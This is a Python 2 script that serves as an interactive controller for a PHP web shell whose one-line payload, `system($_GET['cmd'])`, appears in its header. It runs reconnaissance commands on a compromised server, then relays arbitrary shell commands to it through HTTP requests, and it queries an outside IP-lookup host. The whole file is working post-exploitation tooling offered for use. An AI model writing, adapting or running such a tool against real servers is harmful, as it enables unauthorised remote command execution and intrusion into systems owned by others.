#!/usr/bin/env python
# Written by Ahmed Shawky @lnxg33k
# Command controller for <?php system($_GET['cmd']); ?>

from sys import argv
import urllib2
from urllib2 import urlopen
from subprocess import Popen
import readline

class Commander(object):
    def __init__(self, url=None):
        self.url = url
        self.source = None
        self.info = None
        self.cmd = 'whoami;id;uname -a;pwd;/sbin/ifconfig |grep -B1 "inet addr" |awk \'{ if ( $1 == "inet" ) { print $2 } else if ( $2 == "Link" ) { printf "%s:" ,$1 } }\' |awk -F: \'{ print $3 }\''.replace(' ','%20')

    @staticmethod
    def banner():
        return """\033[93m
         __       ______   ______   .___  ___. .___  ___.      ___      .__   __.  _______
        |  |     /      | /  __  \  |   \/   | |   \/   |     /   \     |  \ |  | |       \\
        |  |    |  ,----'|  |  |  | |  \  /  | |  \  /  |    /  ^  \    |   \|  | |  .--.  |
        |  |    |  |     |  |  |  | |  |\/|  | |  |\/|  |   /  /_\  \   |  . `  | |  |  |  |
        |  |    |  `----.|  `--'  | |  |  |  | |  |  |  |  /  _____  \  |  |\   | |  '--'  |
        |__|     \______| \______/  |__|  |__| |__|  |__| /__/     \__\ |__| \__| |_______/
        ------------------------------------------------------------------------------------\033[0m"""

    def ServerInfo(self):
        print Commander.banner()
        try:
            self.source = source = map(str.strip, urlopen('%s%s' % (self.url, self.cmd)).readlines())
        except urllib2.HTTPError:
            print '\n[!] Invalid URL.'
            exit(1)
        try:
            local_ip = (urlopen('http://85.214.27.38/show_my_ip').readlines())[0].split(':')[1].strip()
        except urllib2.URLError:
            local_ip = 'Unknown'
        available_commands = ['exit', 'clear', 'history', 'info']
        self.info = \
        '''

        \033[91mUser\033[0m     :  \033[92m%s\033[0m
        \033[91mID\033[0m       :  \033[92m%s\033[0m
        \033[91mKernel\033[0m   :  \033[92m%s\033[0m
        \033[91mCWD\033[0m      :  \033[92m%s\033[0m
        \033[91mHost IPs\033[0m :  \033[92m%s\033[0m
        \033[91mLocal IP\033[0m :  \033[92m%s\033[0m
        ---------------------------------------------------------------------------------------------------------

        \033[97m[+] Available commands: %s.\033[0m
        \033[97m[+] Inserting\033[0m \033[91m!\033[0m \033[97mat the begining of the command will execute it on your box.\033[0m
        ''' % (source[0], source[1], source[2], source[3], ', '.join(source[4:]), local_ip, available_commands)
        print self.info

    @staticmethod
    def clean(command):
        return command.replace('%20', ' ')

    def BackConnect(self):
        i = 1
        history = []
        while True:
            try:
                command = raw_input('%s\033[91m@\033[0m\033[92m%s\033[0m:~\033[93m(%s)\033[0m-$ ' % (self.source[0], self.source[4], self.source[3])).replace(' ', '%20')
                history.append(Commander.clean(command))
                if command not in ['exit', 'quite', 'bye']:
                    if command == 'clear':
                        Popen('clear', shell=True).wait()
                    elif command == 'history':
                        x = 1
                        for command in history:
                            print '%2d %s' % (x, command)
                            x += 1
                    elif command.startswith('!'):
                        Popen(Commander.clean(command)[1:], shell=True).wait()
                    elif command == 'info':
                        print self.info
                    else:
                        source = urlopen('%s%s' % (self.url, command)).read()
                        if source:
                            print source.rstrip()
                        else:
                            print '%s: command not found' % Commander.clean(command)
                else:
                    print '\n\n[+] Preformed %d commands on the server.\n[!] Connection closed ..' % i
                    exit(1)
            except KeyboardInterrupt:
                print '\n\n[+] Preformed %d commands on the server.\n[!] Connection closed ..' % i
                exit(1)
            i += 1

def main():
    if len(argv) != 2:
        print '\n[+] Usage : %s Shell_URL\n[!] Example: %s http://www.test.com/shell.php?cmd=' % ((argv[0], )*2)
        exit(1)

    else:
        execute = Commander(str(argv[1]))
        execute.ServerInfo()
        execute.BackConnect()

if __name__ == '__main__':
    main()
